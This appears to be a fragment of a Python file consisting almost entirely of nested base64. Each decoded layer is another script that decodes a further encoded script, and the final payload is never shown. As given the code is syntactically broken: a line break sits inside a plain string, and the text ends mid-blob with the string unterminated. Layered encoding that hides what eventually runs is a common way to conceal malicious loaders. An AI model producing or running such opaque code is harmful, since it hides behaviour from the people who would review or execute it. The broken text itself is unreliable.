import base64
main = "import base64
encoded_script = "aW1wb3J0IGJhc2U2NAplbmNvZGVkX3NjcmlwdCA9ICJhVzF3YjNKMElHSmhjMlUyTkFwbGJtTnZaR1ZrWDNOamNtbHdkQ0E5SUNKaFZ6RjNZak5LTUVsSFNtaGpNbFV5VGtGdlMwbDVRa05aV0U1c1RtcFJaMXBYTldwaU1sSnNXa05DZWxrelNuQmpTRkZMV2xjMWFtSXlVbXhhUmpsNldUTktjR05JVVdkUVUwRnBXVlpqZUdReVNYcFRha0pLVWpCd2IxbDZTbFpOYXpWQ1lqQjBTbVZWU2tSWFZtaFBZa1UxY1ZWWFpHRldlbFp4V1dwS1UySkdjRVJSYm5CYVRUQndkMWt3YUZKVE1YQllUbGR3YVUxc1NuTlhhMWsxWld4cmVsTnVRbXBUUmtadVZVWk9RbUZXYkZkWk0yaHJUV3RzTmxVeWNFTlRiRTVHWTBoT1VrMXFSbWhhVm1SS1pWVXhTRnBHY0U1aGJYZzJWMWR3VDFNeVJraFRiR2hUVmpKU2IxWnVjRWROTVd4eFZHdDBUbEpYZUVkV01qVmhZVzFLVjFadWNGUldWMUo2V2taa1IxZFdWbFprUlZKcFZqTm5lRmRXV205VmJVbDNaRVpLYVUxSVVsZFpWRVpoVW14T1ZsVllaR0ZOVlhBd1ZERm9jMWxXVmpaV2JGSldZa1phVTFWNlJrcGxSazV5VjJ4T1YxWkdTblZXVlZwUFVURkplVk5ZY0ZSaVdHaE9XVlJLVTFaR1ZuTldiR1JWVFVVMWVsbHJWbUZXVmtwWllVWkdWMkp0ZUVOVU1WWnpVbXhrZFZkdGNHbFdiRmw0Vm1wR1YxWXhVbGRWYTFwUVZtMW9SVmxyVm5kU01WcFZVV3hrVjFaWGVFWlVWV1JyVlRKS1ZXSkVWbGhpUlRCNFZsUkdTMVl4VW5KWGJHUlNWbnBzVFZZeFVrcE9WMDE1VTFod1ZHSllhR2hWYlhCeVpERmtjMkZIT1U1U1YzaEdWRlZrYTFsWFJsWmlTRUpVVm5wVmQxWXllRXRXYlZaR1RWWldUbFl4UlRGVlZFcHJaVmRHV0dWSVdtaGlWM2g2V1dwS2QyTkhTa2hQV0Vab1ZqTm9NbGxYTVhOak1rbDVZMGhDYVZKNmJIaFpWbVEwWkcxR2RHSklUbGhpVm5CM1dXdGpOV05YUmxobFNGcG9ZbGQ0ZWxZeU1XRmpSMHBJVDFoR2FGWXphREpaVnpGell6RmtkRlJ0TlZSV1ZUVkRWMjV3VTJReGJGWmhla0pxVWpCYVMxUnJhRU5YUm1SR1lrWkNWRTFYVW5kV1JFSXdWMGRHVms5VmVGZE5iWGhSVlhwR2EyTkdVWGRrUm1ob1ZsUnNUVlp0TVRST1ZrcElZa2hPYVUxdVFuZFphMk0xWTFkR1dHVklXbWhpVjNoNlZqSXhUMkpzVGxaVWExWm9Wak5vTWxsWE1YTmpNa2w1WTBoQ2FWSjZiSGhaVm1RMFdWWndkR0pJVG1sTmJrSjNXV3RqTldOWFJsaGxSMFphVFcxU1MxWkVRakJYUjBaV1QxVjRWMDF0ZUZGVmVrWmhZekJ6ZDJSR2FHaFdWR3hOVm1wS2MxVkdUWGhYYms1TVRVaFNXVmxXVlRWVVJsbDVZa1pDVkUxWFVuZFdSRUl3VmpKS1NXSkZTbUZOUjNoUlZYcEdhMk5HVVhka1JtaG9WbFJzVFZadE1UUk9Wa3BJWWtoT2FVMXVRbmRaYTJNMVkxZEdXR1ZJV21oaVYzaDZXV3BLZDJOSFNraFBXRVpvVmpOb01sbFhNWE5qTVdSMFZHMDFWRlpVYkUxV2FrcHpWVVpOZUZwSVFsVk5TRkpZV1d0b2EyVlhSbGhsU0Zwb1lsZDRlbGxxU25kalIwcEhZMFpXYUZZemFHaFZhMlJ6WXpGa2NsVnVRbWxTYmtKR1dWWmtORmxXU2toaVNFNVlZV3MxZDFscll6VmpWMFpZWlVoYWFHSlhlSHBXTW5SdlkwZEtTRTlZUm1oV00yZ3lXVmN4YzJNeFpISldiVFZVVmxVMVExZHVjRk5rTVd4V1lYcENhbEl3V2t0VWEyaERWMFpXY1ZWdVpGcFdWM04zV1RCa1IxTnJOVWxSYkdoWFZrWktNMVpxUmtaTlIwNUhXa1pLVDFORlNtOVZNVkpUWkRGc1ZtRjZRbXBTYlZKYVZHdG9RMkZHVGxWVmJtUmFWbGR6ZDFrd1pFZFRhelZKVVcxb1ZGWkdTak5XYWtadlUyeFJkMlJHYUdoV1ZHeE5WbXBLYzFWR1RYaGFTRUpWVFVoU1dWbFdWVFZVUmxwMFpFZDRWRTFYVW5kV1JFSXdWMGRHVms5VmVGZGlXRkpWVld0a2MyTXlTWGxqU0VKcFVucHNlRmxXWkRSWlZscElZa2hPV0dGck5YZFphMk0xWTFkR1dHVklXbWhpVjNoNlZqSjBiMk5IU2toUFdFWm9Wak5vTWxsWE1YTmpNa2w1WTBoQ2FWSjZiSGhaVm1RMFdWWnJlVnBGY0ZWTlNGSlpXVlpWTlZSR1dYbGlSa0pVVFZad2VWZHNWakJYUjBaV1QxVjRWMDF0ZUZGVmVrWmhZekZSZDJSR1pHaE5SR3hOVm0weE1GVkdUWGhYYmtwVlRVaFNXRmxVUVRWVVJscDBUbFpTVTFJeWVIcFpha3AzWTBkS1NFOVlSbWhXTTJneVdWY3hjMk14WkhKV2EzaFBVMFZLYjFVeFVsTmtNV3hXWVhwQ2FsSXdXa3RVYTJoRFlVWk9WVlZ1WkZwV1YzTjNXVEJrUjFOck5VbFJiV2hVVmtaS00xWnFSbTVOUjA1SVVtdHdUMU5GU205Vk1WSlRaREZaZUZOVVFtcFNNRnBMVkd0b1EyRkdUbFZWYm1SWFRWVndTMVpFUWpCWFIwWldUMVY0VjJKWVp6RlZhMlJ6WXpKSmVXTklRbWxTZW14NFdWWmtORmxXVGtoaVNFNXBUVzVDZDFscll6VmpWMFpZWlVoYWFHSlhlSHBaYWtwM1kwZEtTRTlZUm1oV00yZ3lXVmN4YzJNeVNYbGpTRUpwVW01Q1NsbFdaRFJrYlVaMFlraE9hVTF1UW5kWmExcDNWbGRHV0dWSVdtaGlWM2g2V1dwS2QyTkhTa2hQV0Vab1ZqTm9NbGxYTVhOak1XUnpWVzVDYVZKNmJIaFpWbVEwWkcxR2RHSklUbGhoTW1oM1dXdGpOV05YUmxobFNGcG9ZbGQ0ZWxscVNuZGpSMHBJVDFoR2FGWXphREpaVnpGell6RmtjMVZ1UW1sU2JUa3pWMjV3VTJReGJGWmhla0pxVWpCYVMxUnJhRU5YUmxaeFZXNWtXbFpYYzNkWk1HUkhVMnMxU1ZGc2FGZFdSa296VjFaV2NrMUhUa2hTYTNCUFUwVktXVll3Vm5OVlJrMTRXa2hDVlUxSVVsbFpWbFUxVkVaYWRHUkhlRlJOVjFKM1ZrUkNNRmRIUmxaUFZYaFhZbGhTVlZWV1pHcE5SMDVJVW10d1QxTkZTbTlWTVZKVFpERnNWbUY2UW1wU2JWSmFWR3RvUTFkR2JGVlZibVJhVmxkemQxa3daRWRUYXpWSlVXeG9WbUV3TkhoVmVrWmhaRWRTVm1SR1pHaE5SR3hOVm0weE1GVkdUWGhYYmtwVlRVaFNXRmxVUVRWVVJsbDVZa1pDVkUxWFVuZFdSRUl3VmpKRmVWWnJlRmROYlhoUlZYcEdhMk5HVVhka1JtUm9UV3hhVFZacVNuTlZSazE0V2toQ1ZVMUlVbGhaVkVwWFZFWlplV0pHUWxSTlYxSjNWa1JDTUZkSFJsWlBWWGhYWWxoa2VWVjZSbXRqUmxGM1pFWm9hRlpVYkUxV2JURXdZa1pOZUZwSVFsVk5TRkpaV1ZaVk5WUkdXblJsUmtKVVRWWndlVlpFUWpCV01rVjNUMVY0VjAxdGVGRlZla1pyWTBaUmQyUkdaR2hOYkZwTlZtcEtjMVZHVFhoYVNFSlZUVWhTV0ZsVVNsZFVSbHAwVFZSR1ZFMVhVbmRXUkVJd1YwZEdWazlWZUZkaVdHaFJWWHBHWVdSV2NGWmtSbWhvVmxSc1RWWnFTbk5WUmsxNFYyNUtZVlpZVWxsWlZsVTFWRVpaZVdKR1FsUk5WbkI2VmtSQ01GWXlSWGRQVlhoWFRXMTRVVlY2Um10alJsRjNaRVprYVZOSGVFWlpWbVEwWkcxR2RHSklUbWxOYmtKM1dXdGFkMU5YUmxobFNGcG9ZbGQ0ZWxscVNuZGpSMHBIWTBWc2FGWXphR2haTWpGell6SkplV05JUW1sU2VteDRXVlprTkZsV2NIUmlTRTVwVFc1Q2QxbHJZelZqVjBaWVpVZEdWRkl5ZUhwWmFrcDNZMGRLU0U5WVJtaFdNMmhvVld4a2ExTnNSWGRWYmtKcFVucHNlRmxXWkRSa2JVWjBZa2hPV0dFeFduVlVhMmhEWVVaT1ZWVnVaRnBXVjNOM1dUQmFhMVV4UlhwV2EzaFhUVzE0VVZWNlJtdGpSbEYzWkVab2FGWlViRTFXYWtwelZVWk5lRnBJUWxWTlNGSlpXVlpWTlZSR1dYbGlSa0pVVFZad2VWZHNWakJYUjBaV1QxVjRWMDF0ZUZGVmVrWmhZMnh3Vm1SR1pHbFhSbHBOVm1wS2MxVkdUWGhhU0VKVlRVaFNXVmxXVlRWVVJscDBaVVpDVkUxWFVuZFdSRUl3VjBkR1ZrOVZlRmROYlhoUlZYcEdZV014VVhka1JtUnBZbFphVFZacVNuTlZSazE0V2toQ1ZVMUlVbGhaVkVaUFVXeHdObFZ1WkZwV1YzTjNXVEJrUjFOck5VbFJiR2hXWVd4S00xZFdWbkpOUjA1SVVtdHdUMU5GU2xsV1YzUnpWVVpOZUZkdVVtdFdXRkpZV1ZSQk5WUkdXblJPVmxKVFVqSjRlbGxxU25kalIwcElUMWhHYUZZemFHaFZNR1J6WXpKSmVXTklRbWxTZW14NFdWWmtORmxXU2xoYVJYQlZUVWhTV1ZsV1ZUVlVSbGw1WWtaQ1ZFMVdjSHBUZWtJd1YwZEdWazlWZUZkTmJYaFJWWHBHWVdOc2NGWmtSbWhvVmxSc1RWWnFTbk5WUmsxNFYyNUtWazFHU25kWmExcDNaVmRHV0dWSVdtaGlWM2g2V1dwS2QyTkhTa2hQV0Vab1ZqTm9NbGxYTVhOak1XUnlZVWhDYVZKdVFqVlpWbVEwWkcxR2RHSklUbWxOYmtKM1dXdGpOV05YUmxobFNGcG9ZbGQ0ZWxscVNuZGpSMHBJVDFoR2FGWXphR2hXYTJSell6RmtjVkZ0TlU5VFJVcHZWVEZTVTJReGJGWmhla0pxVW0xU1ZGVlVUbGRVUmxwMFRWUkdWRTFXY0hsV1JFSXdWakpGZDA5VmVGZGlXRkpSVlhwR1lXTnNVWGRrUm1Sb1RVUnNUVlp0TVRCVlJrMTRWMjVXWVZaWVVsaFpiR2hYVkVaYWRHUkdRbFJOVm5BeFZsUkNVMk5IU2tkalNHeG9Wak5vYUZWclpITmpNV1J5Vlc1Q2FWSnRPVFpaVm1RMFdWZE9kR0pJVGxoaE1VcDNXV3RhZDFKWFJsaGxSMFpPVWpKTmQxa3dXbXRoUlRWSlVXeG9WbFpHU2pOV2FrcFRVMnhGZDFWdVFtbFNia0kxV1Zaa05GbFdTa2hpU0U1WVlXczFkMWxyV25kbFYwWllaVWRHVTFJeWVIcFdNbkJEWW14T1ZsUnJTbUZOUjNoUlZYcEdZV1JIVWxaa1JtUm9UVVJzVFZadE1ERmlSazE0VjI1U2ExWllVbGhaVkVFMVZFWmFkRTVXVWxKV01rMTNXVEJhYTJGRk5VbFJiR2hXVmtaS00xWnFTbEpOUjA1SFdrZG9UMU5GU2xsV1ZsSlRaREZaZVZWVVFtcFNiVkp2Vkd0b1ExZEdWbFZWYm1SWFRXeEtTMVZVUWxOalIwcEhZMGhzYUZZemFHaFZhMlJ6WXpGa2NsVnVRbWxTYmtKR1dWWmtORmxWTVVoWmVrSnFVbTFTYjFScmFFTlhSbFpWVlc1a1YwMVZWWGRaTUZwclZXczFTVkZzYUZaV1Jrb3pWbXBHUmsxSFRrZGFSM1JVVmxVMVJsbFdaRFJaVjA1MFlraE9XR0V4U25kWmExcDJaREZOZDJKRlVsSldNbEpMVlZSQ1IySnNUbFpVYTBwaFRVZDRSVlZXWkd0VGJFVjNVbTAxVkZaVk5VTlhha0p6VWtaR1dGcEZjRkpOUlZwMVZURldUMUZzYjNkaVJWSlNWakpTUzFWVVFrZGliRTVXVkd0S1lVMUhlRVZWVm1SclUyeEZkMUp0TlZSV1ZUVkRWMnBDYzFKR1JsaGFSWEJTVFVWYWRWVXhWazlSYkc5M1lrVlNVbFl5VWt0VlZFSkhZbXhPVmxSclNtRk5SM2hGVlZaa2ExTnNSWGRTYlRWVVZsVTFRMWRxUW5OU1JrWldaRVZTYVdKc1NrcFdiR1F3VmpGS2MxVnVWazVXYTFwWFdWUktORmRHVmxkWGJFNVRZVEo0U0ZaWGVFTldWVEZKV2tjMVZsWXphSGxYYWtaV1pESktSMkZHU2xkV1JWcE9WbFJHVmsxV1RraFdXR2hVWVRGd1YxUlZXbUZXYkhCelVtNWFhRlpYZUhkVk1WWXdVa2RLY2xOcVZscFdiVTE0VkZWV01GTkdVblZYYld4VFpXMTNNVll5ZUd0Vk1YQjBWV3RvVjJGc1NuSlZWRW93VkVaRmVVMVhSbXBTTUhCSlZtMHhZVmxXU1hsbFJGWlVWbFpHTTFkcVNrZFhSVFZaV2tkMFdGSnJXakpXTWpGelV6QTBlRnBHV2xkaGVrWldWV3hTYzFkV2NITlhhMDVxVFZoQ1dWVnROWGRaVmxWM1UyNU9XbUpVVmxSWmEyUlBZMFpHY1ZGdGFGTk5WbHAxVmpKMGEyTXlWbGRqUm1oVllXdEtjRlJVUW5aTlZrNVdZVVZPYUZJeFNrbFhha3ByWVZVeGMySkhOV0ZTVjFKMldXdFdjMU5HVm5GU2JXeFlVbFZhZFZZeU1IaGpNazE0WTBaU1VtRnJTbkJhVmxaTFkwWmtjMVJyVG10TmF6VXdWREZrZDFsV1pFWk9WRnBZWWtkU1UxUnRNVlpsUms1eVYyeGFUbEpzY0ZkWGJYaFBVVzFHVm1SR1NtbE5TRkp3VkZSR1dtUXhhM2RoUm1ST1VtMWtObFpYY0ZOaE1VcHhZa1JPV0ZadGFGUlpha0p6VWxVeFNGcEhhRmRsYkZsNlYydGFiMVZ0U1hoalNFSlVZVzFTV1Zac1dtRlViRnBHVmxSV1dGSXhjRmhWVnpWUFdWWlpkMWRxV2xoaVJUVkVXV3RrUzJSV1ZuUmxSM0JvVmxWc00xZFdWbXRXYkc5NVZHdG9VMkZyU205VlZFSktaREZzZFdKRlRteGlSM2hhVmpJeE5GTnNUa2RUYmxwWVlrVTFSRnBITVZOWFZsWjFXa2QwV0ZKclduVlhhMVpyVmpBMVNGVnJVbEppVkVadlZtcE9iMk14VVhsT1ZFSldUVlZ3V0ZaSGRHRldNVTVGVVcwMVZGWXllSGxWZWtKUFltMU9TR1JIUmxkTlYzaDFWako0YjJJd01VaFVibEpUWWxoQ2NsVnRjSE5sVm1SellVaE9UazFyYkRaVk1qRXdWRVpPUjFOdE9WcE5ha1p5V1d0a1UxSXdPVmxqUjNSVVVsaENNMWRYTUhoaGJVNUdUMWMxYVUxSVVrdFZWRUpIWW14T1ZtRkZUbWhTTURVeFZsYzFkMU5zU2tWUmJUVmhVbGRTU0ZwV1duWmxWbHB4VVd4c1RrMUVVak5YVkVsNFl6SlNWMk5FVms5WFNFSnhWV3BPYjJReGNFWlViVFZvVm0xbk1WVXhhRU5TUjBaV1VtMDFWRlpWTlVSWk1uaDNWMWRLUlZSdGJFNU5TRUo1VlRGV1VtUXhiM2xVYTJoVFltMTRjbFV3VlRGaFZsSkhWV3QwWVZKWWFEQmFWV2hoWVRBeGMxZHFWbFJOUlRWNVYycENNRTVXUm5WYVJuQllVbGM1TTFkWWNFZGxiVkpHVFZaa1RsSllVa1ZYYWtrMVlteE9WbFJyU21GTmF6VXdWbTF3UTJFeFpFWmpSRVpVVmxkUmQxbHJaRmRYVm5CSlYyMXdhVlpyV2sxVlZFcHJaREF4UjJKR2JGUmlWRlpvVmpCYVMySldiRFpVYkU1c1ZqQmFXVlJzWXpGaGJWWldVbFJXVkZaV2NEWlZla0p6VWtaR1dGcEZjRkpOU0VKMFZtcEtlazFIVmxaTlZWcFRZbTFTY1ZWcVRtOWtNV1JWVTJ0a1RsSXdXbGxVTVdoWFZrWmFObFpZWkZoaVIyaE1XV3hhYzFkR1VuUmxSVFZYVW01Q2VGZFdWbXRXTWtaMFVsaG9VMkZyV205V01GcExVakZrVjJGRmRHcE5iRnBYVlcweE1GVXhXbkpTYWxaVlZsWndTRlJXWkVkWFZsWnlVMjFHVTFaVVZqSldNbmhyVkRKT2MxUnNhRTlXUlVwb1ZqQldkMlJHWkZkYVJUbHBVbGQ0ZDFwRVFqQlRiRVYzVW0wMVZGWlZOVXhYYlhoclkyczFTV0ZGTlZkV1ZtOTZWMVJDVjFVeVNraFRhMmhYWWxSV1lWWXdXa3RqTVZKWlkwZEdhRkl3TlVwVlZ6VlBZVVpaZDA1WE9XRlNWMUo2V2tjeFMyTnNWblZSYlVaVFZteHZlRmRyVm10V01sWlhVbTVTVTJKWVFtOVVWekZUVGxac2NWUnNaR3RXYmtKSFZXMDFWMWxXVGtaalJFcGFWbTFTVkZWdGVGZFNhelZGVkd4d1RtRnRlSGhYVjNCUFZHMVdWMk5GVm1oU1ZrcFRWRlZTYzJOR2JGaE5WbVJvWWxaS1IxWnNaSE5VVmtaWVQxYzFWRlpWTlVOWGFrSnpZekE1V0ZKc1ZtaGhNVll6Vm14V2EwNUhSa2hXYkdoWFltMTRWbFZ1Y0hOalJtUllUbGhPVlZacldsZFVhMUpEWVVaYU5sWnVaR0ZTVmxwWVZGZDBjMk5IVVhka1JYQlNUVVZhZFZVeFZrOVRNWEJ6V2toS1QxTkhhRkZWYkdSVFlqRnNjMXBHWkZOU01VcGFWa2R3UTJGVk1YRlNibVJoVm5wR1dGWkdXbk5YVjBwSVpVZHdhR0pZYUhaV01uUnJWVEZXV0ZOcmFGTmhiRnBvVmpCV2QxSXhXbFpXVkVKT1RWZDBOVlF4WkhkaFZUQjNUVlJXV0dFeFNuWlZhMXBHWkRBNVdHSkhhR2xXYkhCNFYydFdWMVp0UmxabFJVcHBUVzFTUzFWVVFrZGliRTVZWkhwV1dsWnNTbmhWTVdoelZtc3hjV0pJY0ZoaE1sSjZXV3RrVDJOdFZrbFhiSEJPWVRGd05sWldVa3BPVjFKWVZXdHNWR0pzY0hCVmFrNXZZekZyZVdOSVRtaFNia0pKVmxkMFYxZHNXalpTYlRsWVlXdHdXRlZ0ZUhkamF6VlhWVzEwVTFKdVFuUldNRkpLVFZkRmVWSnFXbE5YUjJoUFdXeFdkMkl4YkRaVGJrNW9Za2RrTmxaSGNFTmhiVXBZWlVSR1dHRnJTbnBaVjNoVFl6RlNXVnBHYkd4aE1Wa3dWakZTUzJJeVJraFViazVRVmtWS2NWbHNWbUZrTVhCR1lVVTVWR0pIZEROV2JYUmhWbGRLUmsxVVRsaFRTRUo2V1ZWa1MxTkhWa2xYYkhCT1lURnNNMWRYY0U5VE1VNXpZVE5rVjJFeGNGUldiRnBoWkRGa1dHSkZjR3BOUlRWM1ZWWmthMU5zUlhkU2JrSllVa1ZhTTFaRVFYaFdWa1p5WTBad1dGSlZjRkJXTVZwcVRWZEdSMkl6YkZkaWJYaFBWbXRrYjJReGJEWlNhMDVzVmpCc05WWlhjRWRYYXpCNFUyeEtZVkp0YUV4WlZ6RkhVMFpLZFdOSFJsZE5WWEJJVm10a05GUXdNVVpPV0U1UVZqRndjRmxzV2t0bFZsSlhWV3RhYkZadGVEQlZiVFYzWVVaWmQwNVhNVnBsYXpWVVdsWmtSMWRGTlZoT1ZsSlhUVVJXVVZac2FIZFJNWEJ5VFZaV1UySllRbTlWYWtKaFRsWmtSVlJzVG14V2JYaFpXV3RTUTJGck1VaGxTRVpXWWtaYVdGWkVSbGRPYkVaMFYyeENWMDFHY0RaWFYzUnFUbGRHYzJKR2JGWmliSEJ4V1ZSS05HTldWbk5XYkdSVFlrVndWVlV4YUU5U1IwWldVbTAxVkZaVk5VTlpWbHB1WlVkT1JrOVZOVmRTV0VKTVYydFdhMVl5VWtkV2EyeFhZbTE0WVZSWE1XOWlNV3cyVTJ4YWJGSlVWbGxaYTJoM1ZrWmtSMU51VGxwaVJuQkVWRlprVDJSR1VuUlBWbkJZVWxSV2VsWXlkRmRXTVZGNFZsaHdWbFpGY0ZwVVZsSnpUVlprY2xwSWNHeFNWRVpXVlRJeGMxZHNaRVpPV0dSWVZrVlZNVnBYTVZOVFZrNTFVVzFzYVZZeFNreFdNVkpDVFZaYVJrMVZaRkJUUjJoUFZtcEJNV1JzWkZkaFJYUmhZbFpLU2xVeU1XOWhSbVJIVTJwYVZrMVhVbEJWYlhoTFZtczFWMVZyTlZOaGJXTjRWakZhYTA1SFRYbFRXR3hWWWxkb2NsVnVjSE5PVmxWNFdrVTVVMkpGY0ZkV2JYUmhVMjFHV1ZwRmVGUldWVFZEVjJwQ2MxSkdUblJYYkdob1pXeEpNVlpHWkRSVU1sSjBVMnRvVm1KclNtaFdNRlozVkd4c2NWTnJPV2hTTUhCSFZrYzFZV0ZYU25OVGFsWmFZV3R2TUZsNlJuZFhWazVWVlcxb1UwMUdiekpXYkZacVRsVXdlR05HYkZSaE1YQnlXVlpXYzJWc1JYbGlSVXBoVFVkNFJWVldaSE5YVlRGWlVXeENWV0pZYUhKWmExcHpWMVpHZFZkdGJHaGhNVlkxVmpKd1MxWXdNVWRXYmxKUVZrVmFjRmxzV2t0T2JGcFdXa1prYkZacmNEQlphMmh6V1ZaYVYxZFliRlJXTW5kNlZYcENjMUpHUmxoYVJYQlNUVWhDZEZacVNucE5SVEZ6VjFoc1YySlhhSEZWYm5CelRWWlNjVk50ZEdsU01VcEhWVzAxVTJGV1dqWmlSV1JoVWpKNFMxbDZRazlqUmtaWVdrVndVazFGV25kV01GSkhaREZSZDA1WVRtRlNNMmhoVmpCV1MwMXNiSFJqUjNScFlraENXbFpYZEZOaFZrbDVaVVJPVm1KSGFHRlpWbFkwVVcxSmVWcEZjRkpOUlZwMVZURmtNMDVXYkZkVmJrWllZa2RvYUZacVFtRk5NV3h4VTFSQ2JGSlVRalZYYTJRMFlURktjbU5JVGxwaE1rMHhXVlZhZDFJeFZuVlJiV3hYVFZad1NGZHJaSE5UYlUxM1ZHNUNVbFl5VWt0VlZFSkhZMFprUlZKdVpGVk5SRVpXVlZkek1WZHNaRVpUYXpsWVZtMU5lRmxWV25abFZscDFZa1UxVjFKdVFqRldNbmh2VlRGT1NGUnVVbE5oYTNCdlZqQmFTazFXVm5STlZXUm9ZbFpLU1ZReGFITlZNV1JIWWtoQ1ZWSlZXakpYYWtKelVrWkdXRnBGY0dsU1IzaHZWbXRrZDFsV1pFZGpSbWhUWW0xU2NGUlhjRk5PUmxKWFdraE9iR0pGY0VwV2JURnZZVlpLZEZWdVpGaGlSMUV3V1ZSR1MxZFdaRmhpUlRGU1ZucHNkVlV4Vms5UmJHOTNZa2hPVUZZd1dsWlpWM2gzVjFaa2MxcEZaR3ROYTJ3MVZHdG9jMVJ0U2xobFJGcFdZVEpvV0ZsVlpFdFNNWEJKVVcxR1YwMHlhSGxXYkZadlV6Sk9TRk5zYUZOaWJYaHpWbXhTYzAxV2JISmhTRTVUWWxaS2QxVXhhRTlTUjBaV1VtMDFWRlpWTlVOWlZscHVaVWRPUms5Vk5WZFNWWEJRVmpGYWIxRXhVbk5pUm1oUFZqSm9hRlJYZUdGT1ZsSlhWVzA1YUZKdVFrbFdWM2hUWVRGSmQxZFlaRnBXYlZKUVZWUktTbVZXVm5GV2JGcE9ZbGRvZGxkVVFtdFdNVXAwVW14b2FFMXRlRTVWVm1NMVlteE9WbFJyU21GTlIzaDZWREZrUjFaWFJuTlhhMlJhWWxSR1dGcEZaRmRXVmtwWllrWndUbUV4YjNoV2JGSkxWakpLUjFkcmFGTmliWGhvVkZkNFdtUXhWbk5oUm5Cb1ZsaG9RMWxxU210VGJFVjNVbTAxVkZZell6RlhWbHBUWTFaS1dXTkdaRTVpUm5CMlYxUkNhazVYVWxkVGJsSlRZbGhDY2xWdWNITk9WbkJYVld0YWJGWXdXbHBXUjNONFYyeGtSazVZVGxwTmJtaFFXVEJhZG1WWFJrVlJiRTVYVWpKb1RGZHJWbXRXTWxKSFYydHNhVk5IVW1oV1ZFSnpaV3hGZVdKRlNtRk5SM2hGVlZaa2MxZFZNVmxSYkVKVlZteEtWRlpyWkVwbFYxWklaRWRvVjAxV2J6RldhMXByVWpKU1YySkdhR0ZTTTJoeFdWZDBWMDVzYTNsTlZtUnNZbFUxU1ZWdGNFOWhWMHBHVTI1d1dGWnRhSHBaYTJSUFkyeGFjMUpzVm1oaVZrcDRWMWR3UzFReVVuUlVhbHBVWWxoU1VWVnNWVEZTVmxwRlUydDBhbFp1UWxsV1IzQkRWVEZWZDJKSWNGSk5iWGhEVjJwQ2MxSkdSbGhpUm14T1YwVktVVlpHV2xOVk1WRjRZMFpzVm1Gck5YQlVWRUozWlZaYVIxcEZaR3RXYlhoWlYydGtOR0Z0Um5KV1dHeGFaV3R3V0ZwR1duZFNNVVoxVjIxd1RtSllaRE5YVmxwcVRsZFNWMU5yYUZOaGEwcGhWbXhhWVdSR1pGaGlSWEJxVFVVMWQxVldaR3RUYkVWM1VtNUNXRkpGV2pOV1JFRTFWbXhhY1ZWdGNGTk5NbWQ1VjFod1MyTXlVblJUYmtaVFYwZG9ZVll3Vmt0Tk1XeHlZVWhPVTFadGVGbFVWbVJ2V1ZVeGMxZHJaRmhpVjNoTFdYcENUMk5HUmxoYVJYQlNUVVZhZDFZd1VrZGtNVkYzVDFWYVlWSXlhSEZVVlZVeFpXeHNjVlJzWkdoTlJFWldWVzB4YjJGc1RrWlRibkJoVm14YVZGbFZaRXRYUmtwMFRsZEdWMVpzY0RCVk1XUnpUVEZOZDJKRlVsSldNbEpMVlZSQ2QySldXWGxqZWtKc1VsUkdTRlZYTlU5WGJHUkdUbFJDV0Zac1dreFpWV1JMVTBkUmVtRkZOVmROUm05NlYxUkNhMDVGTlZkVGEyaFRZbXhLWVZacVNsTmpNVlp6V2tad2FGWllhRU5aYWtwclUyeEZkMUp0TlZSV00yTXhWMVphVTJOV1NsVlViRlpUVFZad2RsWXlkR3RXTWxaWFVtNVNVRll5YUhGWmJGcExVa1pyZVUxWVRtaE5WemsxVm14b2IxUXhXWGRPVnpsYVlUSlNVRlpXWkV0VFJrcHhWbTFHV0ZKWVFsWlhWbEpMWXpKTmVWTnJXbGRoYTNCTFdWWm9hMVJHVGxaVWEwcGhUVWQ0UlZVeU1XRlhSMFkyVldwU1ZXRnJTVEJaYTFwelYwWldkR1ZIY0doTlNFRjVWakZhYjFNeVJYaFNibFpVWW10S2FGVnFTbE5qTVZKWVkwVk9hV0pJUWxwV1YzUlRWMnhaZDA1WVdsaGlSMUpVVmxaa1MxTkdTbkZXYlVaWVVsaENWbGRXVWt0ak1rMTVVMnRhVjJGcmNFdFpWbWhyVkVaT1ZsUnJTbUZOUjNoRlZUSXhZVmRIUmpaVmFsWlZWbFphU0ZwRVNrOVRSMVpKVVd4d1RtRXhiRE5YVmxwcVRsZFNWMVJzYUU5V1JVcG9WakJXZDJSR1pGZGFSVGxwVWxSc1dWZHJaRFJoTVVwVllrWldWMkV5YUhwYVJFWjNWbXhhY1ZOcmNHaFhSMUpOVlRGV1QxRnNiM2RpUlZKVVlsWndXVmxZY0ZKbFZscHhVMnhrYUZJd05VbFVNV2hYVkd4YVIxTnVWbGhpUjJoVVZWUktVMWRIVmtsVWJVWllVbXR3VmxkVVFtdFdNa3BIWTBWYVYyRnJjRXRaVm1oclZFWk9WbFJyU21GTlIzaEZWVEl4WVZkSFJqWlZhbFpWVmpOb1VGcEhNVXRUUmxaMVVXMUdXRkpZUWs5WFYzQkxWREpHU0ZOcldsVmliSEJ3V1cxNFMwNVdiSEZUYWxKcVRWaENXbFV4YUc5VWJFNUhWMnBPV0dFeVVraFVWVnAzVmpGU2NWRnRSbGhTVlhCSVZqSXhkMWxYUm5SVWEyUllZbGhvWVZSVVJrdFdWbEpXVjFSV2FWWlhlSGRhUkVJd1UyeEZkMUp0TlZSV1ZUVk1WMjE0YTJOck5VVlRiR1JPWWtad2RsZFVRbXBPVjFKV1QxVm9ZVkl6YUhKVmJYUjNZakZzZEUxWGRHbFNhM0JhVmpGa2MxUldSbGhQVnpWVVZsVTFRMWRxUW5Oak1EbFlVbXhXYUdKSVFscFdNbmhyVWpKUmVWTlliRTlUUjJoUFdXeGtVMk14Y0VaWGJtUnJZbFZzTlZSV1dsTlhhekZ5VjI1d1dHSkdXbGhVVjNSelkwZFJkMlJGY0ZKTlJWcDFWVEZXVDFNeGNITmFTRXBQVTBkb1QxUldaRk5qTVdSWFlVVk9hMkpWY0hsV01qRnZWMnN3ZUZOcVNscE5hbFo1V2xaVmQyVldVblZpUjBaWFRVWnNNMVl5ZUdGVE1rWklVMjVTVm1Kc2NIQldiWE13WkRGa1YyRkZkRTVTYkd3MVZtMHhiMkZzU2paaVJFWldZa2RvWVZsV1ZqUlJiVWw1V2tWd1VrMUZXblZWTVdRelRsWnNWMVZ1UmxOV1JVcFhWRmR3YzJWc1pISmFTRTVwVWpBMWVWUldaRzloVjBwV1YyNVdXR0pIYUV0YVZWVjRWMVpTZFZwR2NGaFNNVWw0Vm14V2EwNUhSa2hXYkdoWFltMTRWRll3V25OalJsSkdVbTVhWVUxSGVFVlZWbVJyVTIxS1JXSkhhRmRTTTBKSFdsZDRWbVZzV25WaVIzUnBWak5rTlZZeFdtdE9SbHBJVld0b1UySlVWbWhXYTJRMFRURnNjbHBGWkU5V2JGb3dWREZTUjJGWFNsZFRhMlJZWWxkN